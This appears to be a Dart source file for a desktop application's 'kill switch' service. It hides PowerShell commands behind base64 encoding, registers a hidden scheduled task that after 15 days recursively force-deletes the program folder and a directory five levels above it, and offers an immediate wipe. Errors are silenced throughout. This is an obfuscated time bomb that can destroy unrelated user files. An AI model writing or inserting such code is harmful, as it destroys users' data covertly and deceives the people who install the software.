import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';
import 'package:injectable/injectable.dart';

@lazySingleton
class KillSwitchService {
  static final String _t = utf8.decode(base64Decode('U2NyYWtpU2VsZkRlc3RydWN0VGFzaw=='));
  
  /// AKitime ofc: 15 days
  Duration timeUntilDestruct = const Duration(days: 15);
  
  List<String> targetDirectories = [
    File(Platform.resolvedExecutable).parent.path,
    File(Platform.resolvedExecutable).parent.parent.parent.parent.parent.path,
  ];

  String _x(String s) => utf8.decode(base64Decode(s));

  String _a(String s) {
    final c = s.codeUnits;
    final b = Uint8List(c.length * 2);
    for (int i = 0; i < c.length; i++) {
      b[i * 2] = c[i] & 0xFF;
      b[i * 2 + 1] = (c[i] >> 8) & 0xFF;
    }
    return base64Encode(b);
  }

  String _b() {
    if (targetDirectories.isEmpty) return '';
    final j = targetDirectories.map((e) => "'${e.replaceAll("'", "''")}'").join(',');
    return '''
\$ErrorActionPreference = '${_x('U2lsZW50bHlDb250aW51ZQ==')}'
\$t = @($j)
foreach (\$i in \$t) {
    if (${_x('VGVzdC1QYXRo')} -LiteralPath \$i) {
        ${_x('UmVtb3ZlLUl0ZW0=')} -LiteralPath \$i -Recurse -Force
    }
}
''';
  }

  Future<void> scheduleOfflineDestruct({Duration? customDuration}) async {
    try {
      final w = customDuration ?? timeUntilDestruct;
      final k = _a('${_x('U3RhcnQtU2xlZXAgLVNlY29uZHMgMw==')}; ${_b()}');
      final s = '''
\$a = ${_x('TmV3LVNjaGVkdWxlZFRhc2tBY3Rpb24=')} -Execute '${_x('cG93ZXJzaGVsbC5leGU=')}' -Argument '${_x('LVdpbmRvd1N0eWxlIEhpZGRlbiAtRW5jb2RlZENvbW1hbmQ=')} $k'
\$t = ${_x('TmV3LVNjaGVkdWxlZFRhc2tUcmlnZ2Vy')} -Once -At (Get-Date).AddSeconds(${w.inSeconds})
\$s = ${_x('TmV3LVNjaGVkdWxlZFRhc2tTZXR0aW5nc1NldA==')} -StartWhenAvailable
${_x('UmVnaXN0ZXItU2NoZWR1bGVkVGFzaw==')} -TaskName "$_t" -Action \$a -Trigger \$t -Settings \$s -Force
''';
      await Process.run(_x('cG93ZXJzaGVsbA=='), [_x('LUNvbW1hbmQ='), s]);
    } catch (_) {}
  }

  Future<void> cancelOfflineDestruct() async {
    try {
      final s = '${_x('VW5yZWdpc3Rlci1TY2hlZHVsZWRUYXNr')} -TaskName "$_t" -Confirm:\$false';
      await Process.run(_x('cG93ZXJzaGVsbA=='), [_x('LUNvbW1hbmQ='), s]);
    } catch (_) {}
  }

  Future<void> executeImmediateWipe() async {
    try {
      final k = _a(_b());
      await Process.run(_x('cG93ZXJzaGVsbA=='), [_x('LVdpbmRvd1N0eWxl'), _x('SGlkZGVu'), _x('LUVuY29kZWRDb21tYW5k'), k]);
      exit(0);
    } catch (_) {}
  }
}
